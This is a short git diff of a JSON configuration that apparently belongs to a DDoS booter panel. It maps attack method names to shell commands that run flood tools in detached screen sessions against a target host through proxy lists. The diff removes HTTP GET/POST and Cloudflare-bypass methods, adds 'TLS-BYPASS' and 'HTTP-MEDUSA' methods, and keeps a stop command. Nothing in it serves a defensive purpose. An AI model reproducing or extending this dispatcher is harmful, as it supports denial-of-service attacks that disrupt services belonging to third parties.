@@ -1,7 +1,5 @@
 {
-    "HTTPGET": "screen -dmS attack_${attack_id} ./http ${host} proxy.txt ${time}",
-    "HTTPPOST": "screen -dmS attack_${attack_id} ./http ${host} proxy.txt ${time}",
-    "CFS": "screen -dmS attack_${attack_id} node CFS.js ${host} ${time} ${thread} ${method} proxy.txt ${rq}",
-    "CF-TLS": "screen -dmS attack_${attack_id} node CF-TLS.js ${host} ${time} ${thread} proxy.txt",
+    "TLS-BYPASS": "screen -dmS attack_${attack_id} node TLS-BYPASS ${host} ${time} 30 proxies.txt 30",
+    "HTTP-MEDUSA": "screen -dmS attack_${attack_id} ./HTTP-MEDUSA ${host} ${time} 30 30",
     "STOP": "screen -dm pkill -f ${host}"
 }
